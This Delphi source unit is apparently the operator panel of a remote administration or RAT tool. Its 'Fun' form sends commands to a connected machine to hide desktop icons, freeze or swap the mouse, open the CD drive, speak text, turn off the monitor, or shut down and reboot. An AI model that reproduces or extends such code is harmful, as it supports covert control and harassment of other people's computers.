unit UnitFun;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, jpeg, ExtCtrls, acImage, ComCtrls, ToolWin, UnitMain, StdCtrls,
  SocketUnitEx, UnitCommands, UnitFunctions, UnitVariables, UnitManager;

type
  TFormFun = class(TForm)
    pnlFun: TPanel;
    grp3: TGroupBox;
    btn5: TButton;
    grp6: TGroupBox;
    btn13: TButton;
    grp5: TGroupBox;
    btn10: TButton;
    btn11: TButton;
    btn12: TButton;
    grp4: TGroupBox;
    btn4: TButton;
    btn6: TButton;
    btn8: TButton;
    btn1: TButton;
    btn2: TButton;
    grp7: TGroupBox;
    btn15: TButton;
    edt1: TEdit;
    grp1: TGroupBox;
    btn3: TButton;
    grp2: TGroupBox;
    btn7: TButton;
    btn9: TButton;
    procedure btn4Click(Sender: TObject);
    procedure btn6Click(Sender: TObject);
    procedure btn8Click(Sender: TObject);
    procedure btn10Click(Sender: TObject);
    procedure btn12Click(Sender: TObject);
    procedure btn11Click(Sender: TObject);
    procedure btn13Click(Sender: TObject);
    procedure btn5Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure btn15Click(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure btn7Click(Sender: TObject);
    procedure btn9Click(Sender: TObject);
  private
    { Private declarations }
    Client: TClientDatas;         
    procedure AddLog(Log: string);
    procedure AddSentLog(Log: string);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
  public
    { Public declarations }                  
    constructor Create(aOwner: TComponent; _Client: TClientDatas);
  end;

var
  FormFun: TFormFun;

implementation

{$R *.dfm}

constructor TFormFun.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;
        
procedure TFormFun.AddLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[INFO]', Log, -1, clBlack);
end;

procedure TFormFun.AddSentLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormFun.AddRecvLog(Log: string; lColor: TColor);
begin
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormFun.btn4Click(Sender: TObject);
begin
  case Tag  of
    0:  begin
          Client.SendDatas(DESKTOPHIDEICONS + '|');
          AddSentLog('Disable desktop');
          Tag := 1;
        end;
    1:  begin
          Client.SendDatas(DESKTOPSHOWICONS + '|'); 
          AddSentLog('Enable desktop');
          Tag := 0;
        end;
  end;
end;

procedure TFormFun.btn6Click(Sender: TObject);
begin
  case Tag of
    0:  begin
          Client.SendDatas(DESKTOPHIDETASKSBAR + '|'); 
          AddSentLog('Hide taskbar icons');
          Tag := 1;
        end;
    1:  begin
          Client.SendDatas(DESKTOPSHOWTASKSBAR + '|'); 
          AddSentLog('Show taskbar icons');
          Tag := 0;
        end;
  end;
end;

procedure TFormFun.btn8Click(Sender: TObject);
begin
  case Tag of
    0:  begin
          Client.SendDatas(DESKTOPHIDESYSTEMTRAY + '|');
          AddSentLog('Hide system tray icons');
          Tag := 1;
        end;
    1:  begin
          Client.SendDatas(DESKTOPSHOWSYSTEMTRAY + '|');
          AddSentLog('Show system tray icons');
          Tag := 0;
        end;
  end;
end;

procedure TFormFun.btn10Click(Sender: TObject);
begin
  Client.SendDatas(COMPUTERLOGOFF + '|');
  AddSentLog('Log off user');
end;

procedure TFormFun.btn12Click(Sender: TObject);
begin
  Client.SendDatas(COMPUTERSHUTDOWN + '|');  
  AddSentLog('Shutdown computer');
end;

procedure TFormFun.btn11Click(Sender: TObject);
begin
  Client.SendDatas(COMPUTERREBOOT + '|');  
  AddSentLog('Reboot computer');
end;

procedure TFormFun.btn13Click(Sender: TObject);
begin
  case Tag of
    0:  begin
          Client.SendDatas(CDDRIVEOPEN + '|');
          AddSentLog('Open CD drive');
          Tag := 1;
        end;
    1:  begin
          Client.SendDatas(CDDRIVECLOSE + '|'); 
          AddSentLog('Close CD drive');
          Tag := 0;
        end;
  end;
end;

procedure TFormFun.btn5Click(Sender: TObject);
begin
  case Tag of
    0:  begin
          Client.SendDatas(MOUSESWAPBUTTONS + '|Y');
          AddSentLog('Swap mouse buttons');
          Tag := 1;
        end;
    1:  begin
          Client.SendDatas(MOUSESWAPBUTTONS + '|N');  
          AddSentLog('Unswap mouse buttons');
          Tag := 0;
        end;
  end;
end;

procedure TFormFun.btn1Click(Sender: TObject);
begin
  case Tag of
    0:  begin
          Client.SendDatas(MOUSEFREEZE + '|Y');
          AddSentLog('Freeze mouse cursor');
          Tag := 1;
        end;
    1:  begin
          Client.SendDatas(MOUSEFREEZE + '|N');
          AddSentLog('Unfreeze mouse cursor');
          Tag := 0;
        end;
  end;
end;

procedure TFormFun.btn2Click(Sender: TObject);
var
  TmpStr: string;
  cTime: Integer;
begin
  if not InputQuery('Crazy cursor', 'Set count number', TmpStr) then Exit;
  if TryStrToInt(TmpStr, cTime) = False then Exit;
  Client.SendDatas(MOUSECRAZY + '|' + IntToStr(cTime));
  AddSentLog('Start crazy mouse for count ' + IntToStr(cTime));
end;

procedure TFormFun.btn15Click(Sender: TObject);
begin
  if edt1.Text = '' then Exit;
  Client.SendDatas(COMPUTERSPEAK + '|' + edt1.Text);
  AddSentLog('Speak text -> ' + edt1.Text);
end;

procedure TFormFun.btn3Click(Sender: TObject);
var
  TmpStr: string;
  cTime: Integer;
begin
  if not InputQuery('Beep player', 'Set count number', TmpStr) then Exit;
  if TryStrToInt(TmpStr, cTime) = False then Exit;
  Client.SendDatas(COMPUTERBEEP + '|' + IntToStr(cTime)); 
  AddSentLog('Beep for count ' + IntToStr(cTime));
end;

procedure TFormFun.btn7Click(Sender: TObject);
begin
  case Tag of
    0:  begin
          Client.SendDatas(MONITORPOWER + '|Y');
          AddSentLog('Turn off monitor');
          Tag := 1;
        end;
    1:  begin
          Client.SendDatas(MONITORPOWER + '|N');
          AddSentLog('Turn on monitor');
          Tag := 0;
        end;
  end;
end;

procedure TFormFun.btn9Click(Sender: TObject);
begin
  Client.SendDatas(COMPUTERHIBERNATE + '|');
  AddSentLog('Hibernate computer');
end;

end.
